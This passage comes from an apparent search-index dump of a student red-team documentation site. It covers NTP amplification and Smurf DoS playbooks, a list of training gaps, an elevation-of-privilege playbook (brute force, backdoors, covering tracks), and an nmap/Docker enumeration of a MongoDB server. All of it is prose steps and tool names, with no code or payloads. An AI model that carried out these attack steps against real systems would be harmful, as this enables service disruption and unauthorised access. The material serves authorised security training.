NTPReflection for performing the actual attack.Configuration: Configure the chosen tool to send NTP queries with a spoofed source IP address of the target victim and request the monlist command, which triggers the NTP server to send a list of the last clients that have connected to it.Launch Attack: Initiate the NTP Amplification attack by sending crafted NTP queries to the vulnerable NTP servers, causing them to send large responses to the target victim's IP address.Monitoring: Continuously monitor the impact of the attack on the target victim, observing for increased network traffic, NTP response times, and service disruptions.Adaptation: Adjust attack parameters if necessary to optimize amplification and evasion of detection by network defenses or NTP monitoring systems.Analysis: Analyze the results of the attack to identify weaknesses in NTP server configurations, assess the effectiveness of DDoS mitigation measures, and propose mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"8.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#83-tools--techniques","content":" Nmap: Nmap is a versatile network scanning tool that can be used for reconnaissance purposes. It includes scripts like &quot;ntp-monlist&quot; to identify NTP servers vulnerable to amplification attacks by querying for the monlist command. Nmap's extensive feature set and scriptable nature make it a valuable tool for red teams conducting vulnerability assessments.NTPDOS: NTPDOS is a tool specifically designed for launching NTP amplification attacks. It allows users to specify target NTP servers, spoofed source IP addresses, and other parameters to conduct large-scale NTP amplification attacks. NTPDOS's simplicity and effectiveness make it a preferred choice for red teams assessing network security.NTPReflection: NTPReflection is another tool used for NTP amplification attacks. It automates the process of sending crafted NTP queries to vulnerable NTP servers and analyzing the responses to measure the amplification factor. NTPReflection's user-riendly interface and comprehensive reporting capabilities make it suitable for red teams conducting penetration testing engagements.  ","version":"Next","tagName":"h3"},{"title":"9 Smurf Attack​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#9-smurf-attack","content":"   ","version":"Next","tagName":"h2"},{"title":"9.1 Objective:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#91-objective","content":" The objective of executing a Smurf Attack as a red team is to flood a target network with a large volume of ICMP echo request packets, directing them to the broadcast address of the network, causing network congestion, service disruption, or denial of service. This attack helps assess the resilience of network infrastructure, test the effectiveness of DDoS mitigation measures, and identify potential vulnerabilities in network configurations.  ","version":"Next","tagName":"h3"},{"title":"9.2 Steps:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#92-steps","content":" Reconnaissance: Identify the target network and determine its broadcast address.Tool Selection: Choose a suitable tool for conducting the Smurf Attack. Common tools include Smurf, fragrouter, and hping3.Configuration: Configure the chosen tool to send ICMP echo request packets with a spoofed source IP address of the target victim to the broadcast address of the target network.Launch Attack: Initiate the Smurf Attack by sending a flood of ICMP echo request packets to the broadcast address, causing all hosts within the network to reply to the spoofed source IP address, overwhelming the target victim.Monitoring: Continuously monitor the impact of the attack on the target victim, observing for increased network traffic, ICMP response times, and service disruptions.Adaptation: Adjust attack parameters if necessary to optimize effectiveness and evade detection by network defenses or intrusion detection systems.Analysis: Analyze the results of the attack to identify weaknesses in network configurations, assess the effectiveness of DDoS mitigation measures, and propose mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"9.3 Tools & Techniques:​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#93-tools--techniques","content":" Smurf: Smurf is a tool specifically designed for conducting Smurf Attacks. It allows users to specify the target victim's IP address and the broadcast address of the target network, as well as the number of ICMP echo request packets to send. Smurf's straightforward interface and ease of use make it a preferred choice for red teams assessing network security.fragrouter: fragrouter is a tool used for conducting various network attacks, including Smurf Attacks. It enables the fragmentation and routing of packets to evade detection by intrusion detection systems and firewalls. fragrouter's advanced features, such as packet fragmentation and manipulation, enhance its effectiveness for red teams during penetration testing engagements.hping3: hping3 is a versatile command-line tool for sending custom TCP/IP packets. While not specifically designed for Smurf Attacks, it can be used to craft and send ICMP echo request packets with a spoofed source IP address. hping3's flexibility and scripting capabilities make it suitable for conducting a wide range of network attacks, including Smurf Attacks.  ","version":"Next","tagName":"h3"},{"title":"10 Conclusion​","type":1,"pageTitle":"Denial of Service Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Denial of Service Response#10-conclusion","content":" In closing, this playbook acts as a guardian for red teams, imparting profound insights into an array of Denial of Service attack types. From the relentless barrage of UDP Floods to the cunning exploitation of DNS Amplification, each attack method is dissected, analyzed, and met with formidable countermeasures. By embracing this knowledge, red teams can navigate the turbulent waters of cyber warfare, fortify organizational defenses, and preserve the sanctity of critical assets and services from the tumult of disruptive cyber threats. ","version":"Next","tagName":"h2"},{"title":"Gaps in Unauthorized Login Attempts","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/gap_analysis","content":"Last updated by: buvan008, Last updated on: '23/09/2024' Last updated by: buvan008, Last updated on: '23/09/2024' Gaps in Unauthorized Login Attempts Lack of Practical Reconnaissance: We need more hands-on experience in gathering intelligence about the target.Password Guessing Practice: We haven’t used tools like Hydra in real scenarios to see how effective they are.Credential Stuffing: We haven’t tested stolen credentials using tools like Sentry MBA.Brute Force Attack: We need to practice running brute force attacks with THC-Hydra. Gaps in Exploiting Vulnerabilities Vulnerability Scanning: We haven’t used Nessus or similar tools to scan for weaknesses.Exploit Development: We need more experience in crafting and using exploit code.Persistence Techniques: Using Meterpreter to maintain control after an exploit is something we need to practice. Gaps in Social Engineering Attacks Phishing Campaigns: We need to run actual phishing simulations to see how well they work.Pretexting Scenarios: Creating believable scenarios to trick people into giving up info needs more practice.Baiting: We haven’t set up bait scenarios to lure people into compromising themselves. Gaps in Managing Insider Threats User Activity Monitoring: We need to practice using tools that monitor user behavior.Role-based Access Control (RBAC): Implementing and managing RBAC in real settings needs more experience. Gaps in Establishing Backdoor Access Creating Secret Channels: We need to try out methods for covert communication within systems.Default Credentials: We should practice exploiting systems that use default usernames and passwords.Exploiting Flaws: More practice in identifying and using system flaws to create backdoors is needed. Gaps in Privilege Escalation Exploiting Authentication Weaknesses: We need to find and exploit weak authentication procedures.Misconfigured Permissions: Practicing how to find and use misconfigured permissions for escalating privileges.Software Vulnerabilities: More hands-on experience with tools that exploit software vulnerabilities. Gaps in Handling Data Breaches Social Engineering for Credentials: More practical attempts at tricking people into giving up their credentials.Exploiting Database Vulnerabilities: Practice in using SQL injection and other methods to breach databases.Account Compromises: We need to try out methods for cracking passwords and compromising user accounts. Practical Implementation: Gap: Lack of real-world practice.Suggestion: Conduct regular hands-on simulations. Performance Metrics: Gap: No clear way to measure effectiveness.Suggestion: Set clear measurement criteria for success. Creative Problem-Solving: Gap: Limited encouragement for innovative solutions.Suggestion: Encourage more creative thinking and problem-solving. By addressing these gaps, we can better prepare for real-world cybersecurity challenges and improve our overall security posture.","keywords":"","version":"Next"},{"title":"Elevation Of Pivilage Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage","content":"","keywords":"","version":"Next"},{"title":"1 Introduction:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#1-introduction","content":" In today's rapidly evolving digital landscape, cybersecurity threats continue to pose significant challenges to organizations worldwide. Among the myriad of attack vectors, elevation of privilege attacks stand out as particularly insidious, enabling malicious actors to gain elevated access within systems or networks. This clandestine access empowers attackers to bypass security measures, execute unauthorized actions, and potentially wreak havoc on targeted systems. Understanding the methodologies behind such attacks is paramount for organizations to fortify their defenses effectively.  In this exploration, we delve into five distinct types of elevation of privilege attacks: exploiting vulnerabilities, privilege escalation, social engineering, brute force attacks, and backdoors. For each attack vector, we outline the objectives, tools, and techniques employed by red teams—simulated adversaries—to mimic real-world threats. By comprehensively examining these attack vectors, organizations can enhance their preparedness, fortify their defenses, and mitigate the risk posed by elevation of privilege attacks.  ","version":"Next","tagName":"h2"},{"title":"2 Privilege Escalation:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#2-privilege-escalation","content":"   ","version":"Next","tagName":"h3"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#21-objective","content":" Elevate privileges by exploiting flaws in system configuration or design.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#22-steps","content":" Enumeration: Utilize enumeration tools like enum4linux or PowerSploit to gather detailed information about the target system. This includes enumerating users, groups, shares, services, and other resources that may provide avenues for privilege escalation.Identification of Vulnerabilities:Leverage exploitation frameworks like PowerUp.ps1 or Windows-Exploit-Suggester to identify potential privilege escalation vulnerabilities within the target system. These tools automate the process of analyzing system configurations and identifying known vulnerabilities that could be exploited to escalate privileges.Exploitation: Exploit misconfigured permissions, insecure default settings, or known privilege escalation vulnerabilities to elevate privileges within the target system. This may involve exploiting vulnerabilities in system services, applications, or the underlying operating system to gain elevated access rights.Persistence Mechanisms: Establish persistence mechanisms to maintain elevated privileges even after the initial exploitation. This could involve creating new user accounts with higher privileges, modifying system configurations, or installing persistent backdoors to ensure continued access to the compromised system.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools & Techniques:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#23-tools--techniques","content":" Enumeration tools such as enum4linux or PowerSploit are utilized to systematically gather detailed information about the target system, including user accounts, network shares, and system configuration, aiding in identifying potential vulnerabilities and attack vectors.Exploitation frameworks like PowerUp.ps1 or Windows-Exploit-Suggester are employed to automate the discovery of potential privilege escalation vulnerabilities within Windows environments, facilitating the identification and exploitation of weaknesses to elevate access privileges.Exploiting misconfigured permissions, insecure default settings, or known privilege escalation vulnerabilities involves leveraging weaknesses in system configurations or design flaws to escalate privileges beyond intended levels, granting attackers elevated access to resources and functionalities within the system .  ","version":"Next","tagName":"h3"},{"title":"3 Social Engineering:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#3-social-engineering","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#31-objective","content":" Obtain access to privileged accounts or information through manipulation.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#32-steps","content":" Preparation: Conduct reconnaissance to gather information about the target individuals or organizations. This includes identifying potential targets, their roles within the organization, and any relevant personal or professional information that could be used in the social engineering attack.Crafting Social Engineering Tactics: Develop spear-phishing emails with enticing subject lines and content designed to trick recipients into opening malicious attachments or clicking on malicious links. Additionally,prepare phone scripts or scenarios for impersonating trusted individuals or authority figures during phone calls.Execution: Launch social engineering attacks by sending spear-phishing emails to targeted individuals or making phone calls pretending to be trusted entities. Create fake websites or login pages to steal credentials through phishing attacks. Use pretexting techniques to create plausible scenarios that elicit sensitive information or access from unsuspecting victims.Exploitation of Trust: Exploit the trust of targeted individuals or organizations to obtain access to privileged accounts or sensitive information. This may involve convincing victims to disclose login credentials, share sensitive information, or download and execute malicious files or scripts.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and techniques​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#33-tools-and-techniques","content":" Spear-phishing emails: Crafted with tailored content to deceive recipients into opening attachments or clicking on links, often leading to malware installation or credential theft, exploiting human trust and curiosity for malicious purposes.Phone calls impersonating trusted figures: Utilized to manipulate victims into divulging sensitive information or performing actions by posing as someone they trust, exploiting human tendency to comply with authority.Fake websites for credential theft: Mimic legitimate sites to trick users into entering login credentials, which are then harvested by attackers for unauthorized access, exploiting users' trust in familiar interfaces and brands.Impersonation via email/social media: Pretend to be trusted individuals or entities in digital communications to manipulate victims into sharing sensitive information or taking harmful actions, exploiting the inherent trust people place in online interactions.Pretexting: Fabricating convincing scenarios or stories to manipulate victims into divulging information or performing actions they wouldn't otherwise, exploiting human desire to be helpful or cooperative in social interactions.  ","version":"Next","tagName":"h3"},{"title":"4 Brute Force Attacks:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#4-brute-force-attacks","content":"   ","version":"Next","tagName":"h3"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#41-objective","content":" Guess passwords or access tokens to gain elevated privileges.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#42-steps","content":" Selection of Target: Identify target accounts or systems that may grant elevated privileges if compromised. This could include administrative accounts, service accounts, or accounts with high-level access permissions.Brute Force Tool Selection: Choose appropriate brute force tools like Hydra, Medusa, or THC-Hydra to automate password guessing. Configure the tools to perform brute force attacks against the target accounts or systems using wordlists or dictionaries containing commonly used passwords.Execution: Launch brute force attacks against the target accounts or systems, systematically attempting different password combinations until a valid credential is found. Employ techniques like slow and low to avoid detection by account lockout mechanisms or intrusion detection systems.Credential Stuffing: Utilize breached credentials obtained from previous data breaches to perform credential stuffing attacks against the target accounts or systems. This involves systematically testing compromised credentials to gain unauthorized access to the target environment.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools & Techniques:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#43-tools--techniques","content":" Brute force tools such as Hydra, Medusa, or THC-Hydra automate password guessing by systematically trying different combinations until a correct one is found, exploiting weak or default credentials to gain unauthorized access to systems or accounts.Wordlists or dictionaries containing commonly used passwords serve as the foundation for brute force attacks. These lists include frequently used passwords, dictionary words, and common variations, enabling attackers to efficiently guess credentials during password cracking attempts.Credential stuffing attacks leverage breached credentials obtained from previous data breaches. Attackers use these stolen username and password combinations to gain unauthorized access to other accounts or systems where users have reused their compromised credentials.Slow and low technique involves conducting brute force attacks at a slower pace, with fewer attempts per unit of time, to avoid triggering account lockouts or raising suspicion. This stealthy approach helps evade detection by security measures while persistently attempting to guess passwords.  ","version":"Next","tagName":"h3"},{"title":"5 Backdoors:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#5-backdoors","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#51-objective","content":" Install persistent access mechanisms to maintain elevated privileges.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#52-steps","content":" Selection of Backdoor Tool: Choose appropriate backdoor tools like Meterpreter or Poison Ivy to establish remote access to the compromised system. Select tools that provide stealthy and persistent access while evading detection by security measures.Installation of Backdoor: Install the selected backdoor tool on the compromised system using techniques like exploiting vulnerabilities, social engineering, or physical access. Ensure that the backdoor is configured to establish a covert communication channel with the attacker-controlled infrastructure.Persistence Mechanisms: Implement persistence mechanisms to ensure that the backdoor remains active and undetected even after system reboots or security updates. This may involve modifying system configurations, creating new user accounts, or installing rootkits to hide the presence of the backdoor.Customization: Customize the backdoor tool to suit the specific requirements of the attack, such as evading antivirus detection, bypassing firewall restrictions, or collecting sensitive information discreetly. Develop custom malware tailored to exploit zero-day vulnerabilities and install stealthy backdoors that are difficult to detect and remove.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools & Techniques:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#53-tools--techniques","content":" Remote access trojans (RATs) like Meterpreter or Poison Ivy provide covert remote access to compromised systems, allowing attackers to execute commands, steal data, and maintain control over targeted environments surreptitiously.Web shells are scripts or programs installed on web servers to enable remote access and control. Attackers use them to execute commands, upload/download files, and maintain persistence on compromised systems.Rootkits hide malicious activity by modifying operating system functionality. They enable persistent access and control over compromised systems while evading detection by security tools and concealing their presence from system administrators.Custom malware is specifically designed to evade detection by antivirus software. It employs advanced obfuscation techniques, polymorphism, and encryption to disguise its malicious payload and avoid detection by traditional security measures.Exploiting zero-day vulnerabilities involves leveraging previously unknown security flaws in software to install backdoors or gain unauthorized access. These vulnerabilities provide attackers with a window of opportunity to infiltrate systems before security patches are released.  ","version":"Next","tagName":"h3"},{"title":"6 Exploiting Vulnerabilities​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#6-exploiting-vulnerabilities","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#61-objective","content":" The objective of this Red Team exercise is to simulate a real-world cyberattack scenario where the Red Team aims to gain elevated privileges within the target organization's network by exploiting known software vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#62-steps","content":" Reconnaissance: Conduct reconnaissance to gather information about the target organization's network infrastructure, including IP ranges, domain names, and network services. Utilize tools like Nmap, Shodan, and theHarvester to identify potential entry points and attack surfaces.- Vulnerability Assessment: Use vulnerability scanners like Nessus or OpenVAS to perform a comprehensive assessment of the target organization's systems and applications. Identify potential vulnerabilities,misconfigurations, and missing patches that can be exploited by the Red Team.Exploit Identification: Analyze the results of the vulnerability assessment to identify specific vulnerabilities that can be exploited to gain elevated privileges. Utilize exploit frameworks like Metasploit or Exploit-DB to select appropriate exploits based on the identified vulnerabilities.Exploit Customization: Customize selected exploits or payloads to suit the target environment and maximize the chances of success. Modify exploit parameters, payload options, or shellcode to evade detection by security measures and achieve the desired objectives.Exploitation: Launch the selected exploits against the target systems to exploit identified vulnerabilities and gain unauthorized access. Utilize techniques such as buffer overflow, SQL injection, or code injection to compromise target systems and escalate privileges.Privilege Escalation: Once initial access is gained, escalate privileges to gain elevated access rights within the target organization's network. Exploit additional vulnerabilities or misconfigurations to escalate privileges to administrative or root level.Persistence Establishment: Establish persistence mechanisms to maintain access to the compromised systems even after the initial exploitation. Install persistent backdoors, create new user accounts, or modify system configurations to ensure continued access and control over the target environment.Post-Exploitation Activities: Conduct post-exploitation activities to achieve the Red Team's objectives. This may include exfiltrating sensitive data, installing additional malware or tools, or using the compromised systems as pivot points to launch further attacks within the network.Covering Tracks: Cover tracks to minimize the risk of detection and attribution. Delete logs, remove evidence of the attack, and restore system configurations to their original state to conceal the Red Team's presence and actions.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools & Techniques:​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#63-tools--techniques","content":" Reconnaissance: Tools like Nmap, Shodan, and theHarvester gather information about target systems, networks, and services. They identify potential entry points and vulnerabilities, aiding in understanding the target's infrastructure for effective planning.Vulnerability Assessment: Nessus and OpenVAS conduct thorough scans to identify vulnerabilities, misconfigurations, and missing patches within target systems. They provide insights into security weaknesses, enabling proactive remediation to mitigate potential risks.Exploit Identification: Metasploit and Exploit-DB offer a repository of pre-built exploits and vulnerabilities. They aid in identifying and selecting appropriate exploits to target specific vulnerabilities discovered during reconnaissance and vulnerability assessment phases.Exploit Customization: Scripting languages like Python, Ruby, and PowerShell allow for the customization of exploits to suit target environments. This customization enhances exploit effectiveness by tailoring payloads, parameters, and techniques to evade detection and achieve objectives.Exploitation: Metasploit Console and custom scripts execute selected exploits to compromise target systems. They automate the process of launching attacks, exploiting vulnerabilities, and gaining unauthorized access to exploit identified weaknesses within the target environment.Privilege Escalation: Enumeration tools such as enum4linux, Windows-Exploit-Suggester, and PowerUp.ps1 identify additional vulnerabilities or misconfigurations to escalate privileges. They aid in gaining higher access levels, facilitating further compromise within the target infrastructure.Persistence Establishment: Backdoor tools like Meterpreter, Poison Ivy, and Netcat install persistent access mechanisms. They ensure continued access to compromised systems, allowing attackers to maintain control even after initial exploitation.Post-Exploitation Activities: Data exfiltration tools such as Cobalt Strike, Mimikatz, and PowerSploit facilitate the theft of sensitive information. They extract, manipulate, and exfiltrate data from compromised systems to achieve the Red Team's objectives.Covering Tracks: Log cleaners, file deletion tools, and anti-forensic techniques remove evidence of the attack. They help conceal the Red Team's presence, activities, and the impact of the exploitation, minimizing the risk of detection and attribution.  ","version":"Next","tagName":"h3"},{"title":"7 Conclusion​","type":1,"pageTitle":"Elevation Of Pivilage Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/elevation of privilage#7-conclusion","content":" Elevation of privilege attacks represent a formidable threat landscape that organizations must confront with vigilance and resilience. Through meticulous examination of attack vectors such as exploiting vulnerabilities, privilege escalation, social engineering, brute force attacks, and backdoors, organizations can glean valuable insights into the tactics employed by adversaries. By adopting proactive cybersecurity measures, including robust access controls, ongoing vulnerability assessments, and comprehensive user training, organizations can bolster their defenses against these insidious threats. Moreover fostering a culture of cybersecurity awareness and collaboration is paramount in safeguarding against the ever- evolving landscape of cyber threats. With concerted efforts and a steadfast commitment to cybersecurity, organizations can navigate the complexities of elevation of privilege attacks and fortify their resilience in an increasingly digital world. ","version":"Next","tagName":"h2"},{"title":"Enumeration on Port 27107","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration","content":"","keywords":"","version":"Next"},{"title":"Detect the services running on port 27017:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#detect-the-services-running-on-port-27017","content":"   Explanation:​  -sV: This option enables version detection. It attempts to determine the version of the service running on the open ports.-p 27017: This option tells nmap to scan only port 27017, which is commonly used by MongoDB.The output tells that port 27017/tcp is open and that it is running MongoDB. However, nmap could not fully identify the version of MongoDB.The scan also captured a series of HTTP-like responses, indicating that it could have identified a MongoDB REST API or other services associated with this port.The result shows a successful connection to the MongoDB port but with limited information about the service version, suggesting that further probing or authenticated scanning might be necessary to fully identify the service.  ","version":"Next","tagName":"h3"},{"title":"Service Version Detection on Port 27017:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#service-version-detection-on-port-27017","content":"     Explanation:​  Service Detected: The scan revealed that port 27017 is open and running MongoDB version 7.0.14.Errors Encountered: The scan showed errors for unsupported commands like serverStatus and listDatabases. These are due to MongoDB version 7.0.14, which no longer supports these commands as they were deprecated in MongoDB versions 4.2 and above.Detailed build environment information was captured, including the MongoDB compilation environment (GCC version, compiler flags, etc.).The scan completed successfully in 65.31 seconds, detecting MongoDB version 7.0.14 but with some limitations on command compatibility due to deprecated functionality.  ","version":"Next","tagName":"h3"},{"title":"Service and Build Information on port 27017:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#service-and-build-information-on-port-27017","content":"     Explanation:​  Build Information:Details about how MongoDB was compiled and configured: GCC version: GCC (GNU Compiler Collection) 11.3.0 was used to build this MongoDB instance.MongoDB Build Options: Compilation flags like -fstack-protector-strong, -Wl,-z,now are visible, which provide insights into security measures like stack protection and memory management used during the build.OpenSSL Version: The MongoDB instance uses OpenSSL 3.0.3 (March 2022), important for managing encrypted connections and security. Errors and Deprecated Commands:Several unsupported command errors are shown in the output: Error: Unsupported OP_QUERY command: serverStatus:The MongoDB server no longer supports the OP_QUERY for serverStatus. This suggests that MongoDB 7.0.14 has moved away from certain older commands used by the client or scanning tool.Error: Unsupported OP_QUERY command: listDatabases: Similarly, listDatabases is no longer supported via the legacy OP_QUERY command. This is related to changes in MongoDB's query protocol after version 4.2. These errors are accompanied by a message suggesting upgrading the client driver, and a link to the MongoDB documentation on legacy opcode removal for further clarification. Fingerprint Details: The output includes HTTP-like fingerprinting strings showing attempts to access MongoDB over HTTP. However, these attempts fail, as MongoDB doesn’t communicate directly via HTTP on the native driver port (port 27017).The scan finished after 65.31 seconds, successfully identifying the service (MongoDB 7.0.14) and capturing the deprecated commands and build information.  ","version":"Next","tagName":"h3"},{"title":"Detect vulnerabilities on port 27017:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#detect-vulnerabilities-on-port-27017","content":"   Explanation:​  --script vuln: Instructs nmap to run vulnerability scripts. These scripts attempt to detect known vulnerabilities on the specified service (in this case, MongoDB running on port 27017).The scan checked port 27017 for any known vulnerabilities in MongoDB using the vuln script.No vulnerabilities were detected or listed in the output for the MongoDB service running on the target machine.This could indicate that MongoDB 7.0.14 is well-secured or that any potential vulnerabilities require more advanced methods to detect.  ","version":"Next","tagName":"h3"},{"title":"Install mongodb-clients:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#install-mongodb-clients","content":"     Run a brute-force attack on the MongoDB service to check for weak credentials using the mongodb-brute script. This script tries multiple username/password combinations to see if the MongoDB instance has weak or default credentials that can be exploited to gain access.How the mongodb-brute Script Works: The mongodb-brute script is part of Nmap's scripting engine (NSE), specifically designed for brute-forcing MongoDB credentials.The script tests for a variety of default or common credentials (like admin:admin, root:password) and can be configured to use custom username/password lists if specified.If successful, it will report back which credentials were used to access the MongoDB instance, which could indicate a security vulnerability (weak password).But the scan didn't reveal any credentials for the MongoDB Service.  ","version":"Next","tagName":"h3"},{"title":"Installing Docker:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#installing-docker","content":"   Installing Docker gives a flexible and isolated environment where we can run MongoDB instances on port 27017. This setup will allow us to: Run MongoDB in a safe, controlled environment.Test MongoDB configurations against security threats (like weak authentication or misconfigurations).Experiment with different MongoDB versions or settings without risking the security of your main system.  ","version":"Next","tagName":"h3"},{"title":"Start Docker:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#start-docker","content":" docker run --help, displaying a list of options and flags for running containers, such as detached mode (-d), port mapping (-p), and custom container naming (--name).        ","version":"Next","tagName":"h3"},{"title":"Running MongoDB Container:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#running-mongodb-container","content":"   MongoDB Container Attempt: The first attempt involved running a MongoDB container using the mongo:latestimage (MongoDB 5.0) to connect to host 10.137.0.149 on port 27017.Issue with MongoDB 5.0: The first attempt to pull mongo:latest (MongoDB 5.0) raised a compatibility warning:CPU with AVX support is required: The system does not have a CPU that supports AVX (Advanced Vector Extensions), which is necessary for running MongoDB 5.0.Switching to MongoDB 4.4: A second attempt pulled and used the mongo:4.4 image, which avoided the AVX compatibility issue.MongoDB Shell and Server Versions: The MongoDB shell inside the container is version 4.4.29, while the server being connected to runs version 7.0.14, resulting in a version mismatch warning.Connection Established: Despite the version mismatch, the connection to the MongoDB instance at 10.137.0.149:27017 was successfully established, allowing interaction with the server.  Connection Status:​  The session is connected to the MongoDB server, but authentication failures and permission warnings are preventing full access to the databases or collections.    MongoDB's Security Posture:​  MongoDB 7.0.14 is a relatively recent release. The MongoDB development team actively maintains their software, so major vulnerabilities are typically addressed in newer versions. Newer versions generally come with improved security features, making it harder to find vulnerabilities compared to older, unpatched versions.  ","version":"Next","tagName":"h3"},{"title":"Conclusion:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#conclusion","content":" To conclude, the process involved setting up and interacting with a MongoDB instance using Docker, while scanning port 27017 for vulnerabilities. Although a connection to MongoDB 7.0.14 was established, authentication attempts failed due to misconfigured credentials. MongoDB 7.0.14, being a recent version, is less likely to have easy-to-exploit vulnerabilities, but misconfigurations and poor security practices can still expose the database to risks. A security audit or penetration test should prioritize reviewing configuration issues, such as authentication, network access, and encryption, rather than focusing solely on known software vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"Vulnerability Scanning of Redback Operations IP address 10.137.0.149 Using Nessus:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#vulnerability-scanning-of--redback-operations-ip-address-101370149-using-nessus","content":"   ","version":"Next","tagName":"h2"},{"title":"Create a New Scan (Basic) Enter the IP Address:​","type":1,"pageTitle":"Enumeration on Port 27107","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Enumeration#create-a-new-scan-basic-enter-the-ip-address","content":"   ","version":"Next","tagName":"h3"},{"title":"Scanning the IP 